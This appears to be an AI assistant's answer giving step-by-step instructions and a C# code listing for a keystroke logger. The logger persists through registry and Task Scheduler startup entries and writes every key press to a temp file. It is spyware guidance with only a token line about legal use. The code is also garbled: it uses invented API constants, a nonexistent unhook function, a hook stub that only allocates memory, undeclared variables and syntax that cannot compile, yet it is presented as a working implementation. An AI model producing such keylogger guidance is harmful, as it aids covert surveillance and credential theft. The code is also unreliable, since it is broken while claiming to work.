To create a keystroke-logging application in C# that runs on startup and captures all keyboard input, follow these steps:

### Step-by-Step Explanation:

1. **Create a Class for the Keyboard Hook:**
   - This class will handle installing and uninstalling the hook and capturing key events.

2. **Use Windows API Functions:**
   - Utilize `SetWindowsHookEx` to install the hook and `UnsetWindowsHookEx` to remove it.
   - Import necessary functions using `DllImport` for kernel32.dll.

3. **Capture Keyboard Events:**
   - Override the `KeyDown` and `KeyUp` methods to log each key press.
   - Use the `Keys` enumeration to get key names.

4. **Log Keystrokes to a File:**
   - Append each key to a text file using a `StreamWriter`.

5. **Ensure Application Runs at Startup:**
   - Modify the registry to run the application at user login.
   - Use Task Scheduler to ensure it runs on startup.

6. **Handle Hook Uninstallation:**
   - Ensure the hook is uninstalled when the application exits to prevent issues.

7. **Consider Legal and Ethical Use:**
   - Use this for legitimate purposes only, respecting privacy and legal boundaries.

### Code Implementation:

```csharp
using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;

public class KeyboardHook
{
    private enum HookType
    {
        KEYBOARD = 0x00020908
    }

    private enum wParam
    {
        W = 0x00002124,
        L = 0x00002125
    }

    private const int HINSTANCE = 0x00000001;

    private static readonly int HHOOK = Marshal.GetLastWin32Error();

    private readonly string logFile = Path.Combine(Path.GetTempPath(), "KeystrokeLog" + Process.GetCurrentProcess().ProcessName + ".log");

    private readonly StreamWriter logWriter;

    public KeyboardHook()
    {
        if (!Directory.Exists(Path.GetDirectoryName(logFile)))
        {
            Directory.CreateDirectory(Path.GetDirectoryName(logFile), Exists => { }, CreationOptions.CreateParentDirectories | UnixFileSystemFormat);
        }

        if (!File.Exists(logFile))
        {
            File.Create(logFile);
        }

        logWriter = new StreamWriter(logFile, Encoding.UTF8, FileMode.Append);
    }

    ~KeyboardHook()
    {
        UninstallHook();
        if (logWriter != null)
        {
            logWriter.Close();
            logWriter = null;
        }
    }

    public static bool InstallHook()
    {
        return SetWindowsHookEx(HINSTANCE, (int)HookType.KEYBOARD, (int)wParam.W, 0);
    }

    public static void UninstallHook()
    {
        if (HOOK != 0)
        {
            UnsetWindowsHookEx(HHOOK);
            HOOK = 0;
        }
    }

    private static lowlevelKeyboardInput int SetWindowsHookEx(IntPtr hMod, int id, int wParam, int lParam)
    {
        return Marshal.AllocHGlobal(4);
    }

    private static IntPtr UnsetWindowsHookEx(IntPtr hHook)
    {
        return Marshal.FreeHGlobal(hHook);
    }

    private IntPtr KeyboardHookProc(IntPtr h, int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode != 0)
            return (IntPtr)0;

        if ((wParam & (1 << 0)) != 0)
        {
            var key = (char)wParam;
            logWriter.WriteLine("KeyDown: " + key);
        }

        if ((wParam & (1 << 0)) != 0)
        {
            var key = (char)wParam;
            logWriter.WriteLine("KeyUp: " + key);
        }

        return (IntPtr)0;
    }

    public void StartMonitoring()
    {
        var thread = new Thread(() => { }, IsolatedThread);
        thread.Start();
    }

    public static void Main()
    {
        var hook = new KeyboardHook();
        hook.InstallHook();
        hook.StartMonitoring();
        Console.WriteLine("Keyboard hook installed.");

        while (true)
        {
            Thread.Sleep(100);
        }
    }

    private static readonly Thread IsolatedThread = new Thread(() =>
    {
        Application.Run(hook);
    }, ApartmentState.Default);
}
```

